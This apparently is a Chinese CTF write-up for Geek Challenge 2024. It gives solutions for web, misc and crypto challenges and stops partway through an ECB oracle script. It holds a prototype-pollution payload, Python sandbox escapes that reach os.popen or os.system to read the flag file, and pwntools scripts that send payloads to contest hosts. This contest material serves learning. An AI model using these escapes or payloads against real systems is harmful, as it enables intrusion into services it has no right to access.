class="headerlink" title="ez_js（复现）"></a>ez_js（复现）</h2><p>第一关js原型链污染</p><pre><code>&#123;&quot;username&quot;:&quot;Starven&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;__proto__&quot;:&#123;&quot;hasFlag&quot;:true&#125;&#125;
</code></pre><p>第二关需要绕过逗号<br>用&amp;连接并用syc传参</p><pre><code>?syc=&#123;&quot;username&quot;:&quot;Starven&quot;&amp;syc=&quot;password&quot;:&quot;123456&quot;&amp;syc=&quot;hasFlag&quot;:true&#125;
</code></pre><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="I-wanna-go-to-SYC"><a href="#I-wanna-go-to-SYC" class="headerlink" title="I_wanna_go_to_SYC"></a>I_wanna_go_to_SYC</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/chrysanthemum/p/11986382.html#gallery-7">https://www.cnblogs.com/chrysanthemum/p/11986382.html#gallery-7</a><br>一开始没有发现save1，我是傻逼<br>根据这个payload把第三位加2就能直接到flag房<br><img src="/img/WP/geek2024/save1.png"><br><img src="/img/WP/geek2024/iwanna.png"></p><h2 id="Welcome-jail"><a href="#Welcome-jail" class="headerlink" title="Welcome_jail"></a>Welcome_jail</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;nc1.ctfplus.cn&quot;</span>, <span class="number">22957</span>)</span><br><span class="line">cmd = <span class="string">&quot;cat /home/ctf/flag&quot;</span></span><br><span class="line">exp = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cmd:</span><br><span class="line">    exp += <span class="string">&quot;chr(&quot;</span> + <span class="built_in">str</span>(<span class="built_in">ord</span>(i)) + <span class="string">&quot;)+&quot;</span></span><br><span class="line">exp = exp.rstrip(<span class="string">&quot;+&quot;</span>).encode()  <span class="comment"># 去掉最后多余的 &quot;+&quot;</span></span><br><span class="line">payload = (</span><br><span class="line">    <span class="string">b&quot;print([].__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[chr(112)+chr(111)+chr(112)+chr(101)+chr(110)](%b).read())&quot;</span></span><br><span class="line">    % exp</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(io.recvline())</span><br></pre></td></tr></table></figure><h2 id="cimbar"><a href="#cimbar" class="headerlink" title="cimbar"></a>cimbar</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/sz3/cimbar">https://github.com/sz3/cimbar</a><br>搜cimbar看到原理和给的图很相像，点进去得到cimbar的加密方式<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/sz3/libcimbar/blob/master/DETAILS.md">https://github.com/sz3/libcimbar/blob/master/DETAILS.md</a><br><img src="/img/WP/geek2024/cimbar.png"><br>照着上面输入就OK了</p><h2 id="ez-pcap-1"><a href="#ez-pcap-1" class="headerlink" title="ez_pcap_1"></a>ez_pcap_1</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">strings flag.pcapng | grep <span class="string">&quot;SYC&#123;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/img/WP/geek2024/pcap.png"></p><h2 id="Truth-of-Word"><a href="#Truth-of-Word" class="headerlink" title="Truth of Word"></a>Truth of Word</h2><p><img src="/img/WP/geek2024/word1.png"><br>flag1: SYC{W0rd_H@5<br><img src="/img/WP/geek2024/word2.png"><br>flag2: @_Ama1n9_<br>把.docu后缀改为.zip，发现藏有flag03.png<br><img src="/img/WP/geek2024/word3.png"><br>flag3: StrUCtu3e!}</p><h2 id="2024-geek-challenge-签到"><a href="#2024-geek-challenge-签到" class="headerlink" title="2024 geek challenge! 签到"></a>2024 geek challenge! 签到</h2><p>签到</p><h2 id="doSomeMath"><a href="#doSomeMath" class="headerlink" title="doSomeMath"></a>doSomeMath</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">white_List=[<span class="string">&quot;+&quot;</span>,<span class="string">&quot;-&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;/&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;g&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;l&quot;</span>,<span class="string">&quot;t&quot;</span>,<span class="string">&quot;(&quot;</span>,<span class="string">&quot;)&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;,&quot;</span>]</span><br><span class="line">flag=os.environ.get(<span class="string">&quot;GEEK_FLAG&quot;</span>) <span class="keyword">if</span> os.environ.get(<span class="string">&quot;GEEK_FLAG&quot;</span>)!=<span class="literal">None</span> <span class="keyword">else</span> <span class="string">&quot;SYC&#123;test&#125;&quot;</span></span><br><span class="line">banner=<span class="string">&#x27;&#x27;&#x27;     _      ____                       __  __       _   _</span></span><br><span class="line"><span class="string">  __| | ___/ ___|  ___  _ __ ___   ___|  \/  | __ _| |_| |__</span></span><br><span class="line"><span class="string"> / _` |/ _ \___ \ / _ \| &#x27;_ ` _ \ / _ \ |\/| |/ _` | __| &#x27;_ \\</span></span><br><span class="line"><span class="string">| (_| | (_) |__) | (_) | | | | | |  __/ |  | | (_| | |_| | | |</span></span><br><span class="line"><span class="string"> \__,_|\___/____/ \___/|_| |_| |_|\___|_|  |_|\__,_|\__|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> s.isascii():</span><br><span class="line">        exit(<span class="string">&quot;Please input ascii&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> word <span class="keyword">not</span> <span class="keyword">in</span> white_List:</span><br><span class="line">            exit(<span class="string">&quot;hacker!!!!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(banner)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;please do this math problem&quot;</span>)</span><br><span class="line"><span class="comment">#9872</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = <span class="built_in">input</span>(<span class="string">&quot;99*100^60= &quot;</span>)</span><br><span class="line">        waf(result)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="number">99</span> * <span class="number">100</span> ^ <span class="number">60</span> == <span class="built_in">eval</span>(result):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Congradulation!!!!! Here is your reward: &quot;</span> + flag)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;not right&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;error&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>().__ge__(())</code> 可以构造出1，意思是()是否大于等于()。<br>接下来只要构造出9872就好，注意eval有字符长度限制</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;nc1.ctfplus.cn&quot;</span>, <span class="number">36582</span>)</span><br><span class="line">s = <span class="string">&quot;().__ge__(())&quot;</span>  <span class="comment"># 1</span></span><br><span class="line">s_2 = <span class="string">&quot;&quot;</span></span><br><span class="line">s_7 = <span class="string">&quot;&quot;</span></span><br><span class="line">s_8 = <span class="string">&quot;&quot;</span></span><br><span class="line">s_9 = <span class="string">&quot;&quot;</span></span><br><span class="line">s_10 = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    s_2 += s + <span class="string">&quot;+&quot;</span></span><br><span class="line">s_2 = s_2[:-<span class="number">1</span>]</span><br><span class="line">s_2 = <span class="string">&quot;(&quot;</span> + s_2 + <span class="string">&quot;)&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    s_7 += s + <span class="string">&quot;+&quot;</span></span><br><span class="line">s_7 = s_7[:-<span class="number">1</span>]</span><br><span class="line">s_7 = <span class="string">&quot;(&quot;</span> + s_7 + <span class="string">&quot;)&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    s_8 += s + <span class="string">&quot;+&quot;</span></span><br><span class="line">s_8 = s_8[:-<span class="number">1</span>]</span><br><span class="line">s_8 = <span class="string">&quot;(&quot;</span> + s_8 + <span class="string">&quot;)&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    s_9 += s + <span class="string">&quot;+&quot;</span></span><br><span class="line">s_9 = s_9[:-<span class="number">1</span>]</span><br><span class="line">s_9 = <span class="string">&quot;(&quot;</span> + s_9 + <span class="string">&quot;)&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    s_10 += s + <span class="string">&quot;+&quot;</span></span><br><span class="line">s_10 = s_10[:-<span class="number">1</span>]</span><br><span class="line">s_10 = <span class="string">&quot;(&quot;</span> + s_10 + <span class="string">&quot;)&quot;</span></span><br><span class="line"><span class="comment"># payload=9*10*10*10+8*10*10+7*10+2</span></span><br><span class="line"><span class="comment"># print(eval(s_2))</span></span><br><span class="line"><span class="comment"># print(eval(s_7))</span></span><br><span class="line"><span class="comment"># print(eval(s_8))</span></span><br><span class="line"><span class="comment"># print(eval(s_9))</span></span><br><span class="line"><span class="comment"># print(eval(s_10))</span></span><br><span class="line">payload = s_9 + <span class="string">&quot;*&quot;</span> + s_10 + <span class="string">&quot;*&quot;</span> + s_10 + <span class="string">&quot;*&quot;</span> + s_10</span><br><span class="line">payload += <span class="string">&quot;+&quot;</span> + s_8 + <span class="string">&quot;*&quot;</span> + s_10 + <span class="string">&quot;*&quot;</span> + s_10</span><br><span class="line">payload += <span class="string">&quot;+&quot;</span> + s_7 + <span class="string">&quot;*&quot;</span> + s_10</span><br><span class="line">payload += <span class="string">&quot;+&quot;</span> + s_2</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">eval</span>(payload))</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(io.recvline())</span><br><span class="line"><span class="comment"># 9872</span></span><br></pre></td></tr></table></figure><h2 id="hard-jail"><a href="#hard-jail" class="headerlink" title="hard_jail"></a>hard_jail</h2><p>为了构造斜杠卡了好久，不同版本doc文档不一样是最恶心的。<br>出题人催促我们换新版本（确信）<br>原理就是把__file__换成&#x2F;flag，利用show读取</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(os.__doc__)</span><br><span class="line">i = <span class="number">40</span></span><br><span class="line">io = remote(<span class="string">&quot;nc1.ctfplus.cn&quot;</span>, <span class="number">25584</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;import os&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;a=os.__doc__&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;b=a[424]+a[42]+a[4]+a[51]+a[9]+a[424]+a[89]+a[6]&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;b+=a[12]+a[424]+a[12]+a[83]+a[43]+a[36]&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;__file__=b&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;show&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(io.recvline())</span><br><span class="line"><span class="comment"># import os</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># str = &quot;/home/ctf/flag&quot;</span></span><br><span class="line"><span class="comment"># for i in str:</span></span><br><span class="line"><span class="comment">#     print(&quot;a[&quot;, end=&quot;&quot;)</span></span><br><span class="line"><span class="comment">#     print(os.__doc__.find(i), end=&quot;&quot;)</span></span><br><span class="line"><span class="comment">#     print(&quot;]+&quot;, end=&quot;&quot;)</span></span><br></pre></td></tr></table></figure><p>出题人预期解：<br>无括号绕过</p><pre><code>help.__class__.__eq__=exec
help.__class__.__getattribute__=input
help==help.a
# 进入input
__import__(&#39;os&#39;).system(&#39;cat /home/ctf/flag&#39;)
</code></pre><h2 id="舔狗的觉醒"><a href="#舔狗的觉醒" class="headerlink" title="舔狗的觉醒"></a>舔狗的觉醒</h2><p>ARCHPR跑出压缩包密码为8个8（竟然有8位！）<br>看文档开头 05 b4 30 40判断是字节的两位之间调换了位置，能恢复成zip文件<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/AabyssZG/FileReverse-Tools">https://github.com/AabyssZG/FileReverse-Tools</a> 用这个的 -re 参数恢复<br>解压发现flag.pdf文件，需要移开图片，但pdf上了锁。<br>搜索pdf解锁找到一个在线解锁pdf的网站<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.ilovepdf.com/zh-cn/unlock_pdf">https://www.ilovepdf.com/zh-cn/unlock_pdf</a><br>用这个打开 flag_unlocked.pdf 移开图片拿到flag<br><img src="/img/WP/geek2024/hero.png"></p><h2 id="雪"><a href="#雪" class="headerlink" title="雪"></a>雪</h2><p>snow加密。压缩包密码是最后的base64编码。<br>用WaterMarkH.exe提取syclover_WaterMark.png<br><img src="/img/WP/geek2024/watermark.png"><br>得到 snow 解密的密码为Th1si4st8eK3y<br><img src="/img/WP/geek2024/snow.png"></p><h2 id="ez-climbstairs"><a href="#ez-climbstairs" class="headerlink" title="ez_climbstairs"></a>ez_climbstairs</h2><p>这题我环境有问题，跑不出来，交给队友跑的，然后他交上flag后我又能跑了。。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sys.set_int_max_str_digits(<span class="number">100000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">climb_stairs</span>(<span class="params">n</span>):</span><br><span class="line">    dp = [<span class="number">0</span>] * (n + <span class="number">1</span>)</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">    dp[<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">    dp[<span class="number">2</span>] = <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, n + <span class="number">1</span>):</span><br><span class="line">        dp[i] = dp[i - <span class="number">1</span>] + dp[i - <span class="number">2</span>] + dp[i - <span class="number">3</span>]</span><br><span class="line">    <span class="keyword">return</span> dp[n]</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;nc1.ctfplus.cn&quot;</span>, <span class="number">20140</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    num = <span class="built_in">int</span>(io.recvuntil(<span class="string">&quot; &quot;</span>)[:-<span class="number">1</span>].decode())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;解析出的楼梯数: <span class="subst">&#123;num&#125;</span>&quot;</span>)</span><br><span class="line">    payload = <span class="built_in">str</span>(climb_stairs(num)).encode()</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    response = io.recvline().decode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;服务器返回: <span class="subst">&#123;response&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(io.recvline())</span><br></pre></td></tr></table></figure><h2 id="ez-jpg"><a href="#ez-jpg" class="headerlink" title="ez_jpg"></a>ez_jpg</h2><p>base64编码后发现是个以9DFF开头的十六进制字符串<br>根据题目名称判断为jpg结尾FFD9经过了反转<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/AabyssZG/FileReverse-Tools">https://github.com/AabyssZG/FileReverse-Tools</a> 用工具的-r参数反转得到一个jpg文件<br><img src="/img/WP/geek2024/reverse.jpg"><br>最后在随波逐流找到了jpg修改高度<br><img src="/img/WP/geek2024/suijpg.png"><br>图片增加高度后拿到flag<br><img src="/img/WP/geek2024/reverse2.jpg"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">p = getPrime(<span class="number">128</span>)</span><br><span class="line">q = getPrime(<span class="number">128</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;q = <span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 33108009203593648507706487693709965711774665216872550007309537128959455938833</span></span><br><span class="line"><span class="string">p = 192173332221883349384646293941837353967</span></span><br><span class="line"><span class="string">q = 172282016556631997385463935089230918399</span></span><br><span class="line"><span class="string">c = 5366332878961364744687912786162467698377615956518615197391990327680664213847</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>很符合新生赛难度</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">33108009203593648507706487693709965711774665216872550007309537128959455938833</span></span><br><span class="line">p = <span class="number">192173332221883349384646293941837353967</span></span><br><span class="line">q = <span class="number">172282016556631997385463935089230918399</span></span><br><span class="line">c = <span class="number">5366332878961364744687912786162467698377615956518615197391990327680664213847</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d=inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;RSA_is_easy&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="不是套娃"><a href="#不是套娃" class="headerlink" title="不是套娃"></a>不是套娃</h2><p>题目附件 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://pan.baidu.com/s/1YQuXvK7wNrhLoCUcmWEMZw">https://pan.baidu.com/s/1YQuXvK7wNrhLoCUcmWEMZw</a> 提取码：game<br>粗看是一个压缩包套娃<br>第一关摩斯密码<br><img src="/img/WP/geek2024/tw1.png"><br>第二关维吉利亚<br><img src="/img/WP/geek2024/tw2.png"><br>第三关哈希密码逆向<br>哈希字符串为a1fdbce928af7aae<br><a target="_blank" rel="external nofollow noopener noreferrer" href="http://www.somd5.com/">http://www.somd5.com</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="http://www.cmd5.com/">http://www.cmd5.com</a><br>随便一个网站逆出它，为HaiKav<br>第四关 NEFICPIC&amp;CRTCTNEYO<br>随波逐流yyds<br><img src="/img/WP/geek2024/tw4.png"><br>NICECTF&amp;NICECRYPTO<br>第五关<br>提示给的很明显<br>base100 -&gt; rot13 -&gt; base64 -&gt; base65536<br>base100:<a target="_blank" rel="external nofollow noopener noreferrer" href="https://ctf.bugku.com/tool/base100">https://ctf.bugku.com/tool/base100</a><br>base65536:<a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.better-converter.com/Encoders-Decoders/Base65536-Decode">https://www.better-converter.com/Encoders-Decoders/Base65536-Decode</a><br><img src="/img/WP/geek2024/tw5.png"><br>原爞，启动！<br>什么？不对？幸亏 <code>原神，启动！</code> 是对的<br>最后就拿到flag了，flag竟然没藏（嘘）</p><h2 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">p,q = [getPrime(<span class="number">1024</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)] </span><br><span class="line">n = p*q</span><br><span class="line">e = [getPrime(<span class="number">10</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">c = [<span class="built_in">pow</span>(m, e[i], n) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e1 = <span class="subst">&#123;e[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e2 = <span class="subst">&#123;e[<span class="number">1</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c1 = <span class="subst">&#123;c[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c2 = <span class="subst">&#123;c[<span class="number">1</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 19742875423645690846073637620470497648804310111201409901059297083827103813674034450200432098143959078292346910591785265323563248781526393718834491458926162514713269984791730816121181307827624489725923763353393879316510062227511469438742429290073999388690825732236465647396755899136346150862848924231619666069528077790933176798057396704758072769660663756346237040909579775389576227450505746914753205890194457812893098491264392293949768193694560954874603451253079446652049592976605414438411872223250039782381259212718733455588477129910357095186014496957765297934289263536712574572533650393220492870445376144568199077767</span></span><br><span class="line"><span class="string">e1 = 911</span></span><br><span class="line"><span class="string">e2 = 967</span></span><br><span class="line"><span class="string">c1 = 18676091924461946809127036439355116782539894105245796626898495935702348484076501694838877829307466429933623102626122909782775514926293363853121828819237500456062111805212209491398720528499589486241208820804465599279152640624618194425740368495072591471531868392274503936869225072123214869399971636428177516761675388589238329574042518038702529606188240859751459632643230538522947412931990009143731829484941397093509641320264169403755707495153433568106934850283614529793695266717330769019091782929139589939928210818515744604847453929432990185347112319971445630830477574679898503825626294542336195240055995445217249602983</span></span><br><span class="line"><span class="string">c2 = 4229417863231092939788858229435938841085459330992709019823280977891432565586698228613770964563920779991584732527715378842621171338649745186081520176123907689669636473919678398014317024138622949923292787095400632018991311254591786179660603414693984024161009444842277220189315861986306573182865656366278782315864366857374874763243428496061153290565891942968876789905670073321426112497113145141539289020571684634406829272902118484670099097148727072718299512735637087933649345419433312872607209633402427461708181971718804026293074540519907755129917132236240606834816534369171888633588190859475764799895410284484045429152</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>家人们真是共模攻击，出的也很基础<br>套公式就行</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">19742875423645690846073637620470497648804310111201409901059297083827103813674034450200432098143959078292346910591785265323563248781526393718834491458926162514713269984791730816121181307827624489725923763353393879316510062227511469438742429290073999388690825732236465647396755899136346150862848924231619666069528077790933176798057396704758072769660663756346237040909579775389576227450505746914753205890194457812893098491264392293949768193694560954874603451253079446652049592976605414438411872223250039782381259212718733455588477129910357095186014496957765297934289263536712574572533650393220492870445376144568199077767</span></span><br><span class="line">e1 = <span class="number">911</span></span><br><span class="line">e2 = <span class="number">967</span></span><br><span class="line">c1 = <span class="number">18676091924461946809127036439355116782539894105245796626898495935702348484076501694838877829307466429933623102626122909782775514926293363853121828819237500456062111805212209491398720528499589486241208820804465599279152640624618194425740368495072591471531868392274503936869225072123214869399971636428177516761675388589238329574042518038702529606188240859751459632643230538522947412931990009143731829484941397093509641320264169403755707495153433568106934850283614529793695266717330769019091782929139589939928210818515744604847453929432990185347112319971445630830477574679898503825626294542336195240055995445217249602983</span></span><br><span class="line">c2 = <span class="number">4229417863231092939788858229435938841085459330992709019823280977891432565586698228613770964563920779991584732527715378842621171338649745186081520176123907689669636473919678398014317024138622949923292787095400632018991311254591786179660603414693984024161009444842277220189315861986306573182865656366278782315864366857374874763243428496061153290565891942968876789905670073321426112497113145141539289020571684634406829272902118484670099097148727072718299512735637087933649345419433312872607209633402427461708181971718804026293074540519907755129917132236240606834816534369171888633588190859475764799895410284484045429152</span></span><br><span class="line">_, s1, s2 = gmpy2.gcdext(e1, e2)</span><br><span class="line">m = <span class="built_in">pow</span>(c1, s1, n) * <span class="built_in">pow</span>(c2, s2, n) % n</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;U_can_really_attack&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="ECBpad"><a href="#ECBpad" class="headerlink" title="ECBpad"></a>ECBpad</h2><p>跟BaseCTF2024 week4的 <strong>ECB是不安全的</strong> 很像（一模一样），当时恰好尝试过，但是不会，抄题解不会还不会吧。<br>于是就抄了，原理人家在题解写的很清楚，贴个连接<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://j0zr0js7k7j.feishu.cn/docx/MS06dyLGRoHBfzxGPF1cz0VhnGh">https://j0zr0js7k7j.feishu.cn/docx/MS06dyLGRoHBfzxGPF1cz0VhnGh</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;nc1.ctfplus.cn&quot;</span>, <span class="number">38312</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line">p.sendline(<span class="string">b&quot;yes&quot;</span>)</span><br><span class="line">p.sendline()</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your cipher:&quot;</span>)</span><br><span class="line">c = p.recvline()[:-<span class="number">1</span>].strip()</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">c = <span class="built_in">bytes</span>.fromhex(c.decode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line"></span><br><span class="line">length1 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    p.sendline(<span class="string">b&quot;yes&quot;</span>)</span><br><span class="line">    payload = <span class="string">b&quot;a&quot;</span> * i</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your cipher:&quot;</span>)</span><br><span class="line">    d = p.recvline()[:-<span class="number">1</span>].strip()</span><br><span class="line">    <span class="built_in">print</span>(d)</span><br><span class="line">    d = <span class="built_in">bytes</span>.fromhex(d.decode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(d) != <span class="built_in">len</span>(c):</span><br><span class="line">        length1 = i</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">length_flag = <span class="built_in">len</span>(c) - length1</span><br><span class="line"><span class="built_in">print</span>(length_flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从前往后爆破flag</span></span><br><span class="line">payload_length = <span class="built_in">len</span>(c) + <span class="number">16</span>  <span class="comment"># 多一个分组保容错</span></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span 